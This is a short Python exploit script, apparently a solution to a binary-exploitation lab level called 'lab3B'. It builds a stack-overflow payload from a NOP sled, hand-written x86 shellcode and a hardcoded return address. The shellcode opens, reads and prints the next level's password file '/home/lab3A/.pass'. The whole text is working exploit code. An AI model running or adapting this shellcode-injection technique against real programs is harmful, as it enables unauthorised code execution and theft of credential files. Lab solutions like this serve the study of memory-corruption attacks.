from pwn import *

# Shellcode breakdown
# push '/home/lab3A/.pass'
# open([file path], 0)
# read(fffffff3, [file pointer], size)
# write(1, [file pointer], size)

shellcode = "\x6a\x73\x68\x2e\x70\x61\x73\x68\x62\x33\x41\x2f\x68\x65\x2f\x6c\x61\x68\x2f\x68\x6f\x6d\xb9\x00\x00\x00\x00\x89\xe3\xb8\x05\x00\x00\x00\xcd\x80\xba\x28\x00\x00\x00\x89\xe1\x89\xc3\xb8\x03\x00\x00\x00\xcd\x80\xba\x28\x00\x00\x00\x89\xe1\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x80"

ret2nop = 0xb7fd7024

payload = ""
payload += "\x90" * (156-71)
payload += shellcode
payload += "\x24\x70\xfd\xb7"


print payload

# python /tmp/x3B.py | ./lab3B
